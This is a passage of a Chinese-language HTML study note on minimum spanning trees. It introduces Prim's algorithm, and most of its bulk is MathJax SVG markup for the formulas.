443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(3769,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mi" transform="translate(4713.8,0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mo" transform="translate(5705,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(6705.2,0)"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g></g></g></svg></mjx-container>，则必存在一棵包含边(u,v)的最小生成树。</p><h5 id="3-2-4-1-1-普利姆-Prim-算法"><a href="#3-2-4-1-1-普利姆-Prim-算法" class="headerlink" title="3.2.4.1.1 普利姆(Prim)算法"></a>3.2.4.1.1 普利姆(Prim)算法</h5><p>算法思想：设N=(V,E)是连通网，TE是N上最小生成树中边的集合。初始令<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="28.457ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 12578.1 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mo" transform="translate(1044.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2100.6,0)"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(2600.6,0)"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(3609.1,0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g><g data-mml-node="mo" transform="translate(4109.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(4553.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(4942.8,0)"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(6229.1,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mi" transform="translate(7173.9,0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mo" transform="translate(7942.9,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(8331.9,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(8776.6,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(9480.6,0)"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mo" transform="translate(10522.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(11578.1,0)"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="mo" transform="translate(12078.1,0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container>。在所有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="16.905ex" height="1.984ex" role="img" focusable="false" viewBox="0 -683 7472.2 877"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(849.8,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mi" transform="translate(1794.6,0)"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mo" transform="translate(2561.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(3006.2,0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(3769,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mi" transform="translate(4713.8,0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mo" transform="translate(5705,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(6705.2,0)"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g></g></g></svg></mjx-container>的边<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="9.652ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 4266.2 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(961,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1405.7,0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(1890.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2557.4,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mi" transform="translate(3502.2,0)"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g></g></g></svg></mjx-container>中，找一条代价最小的边<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="7.133ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3152.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(1397.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1842.2,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mn" transform="translate(518,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(2763.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="7.133ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3152.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 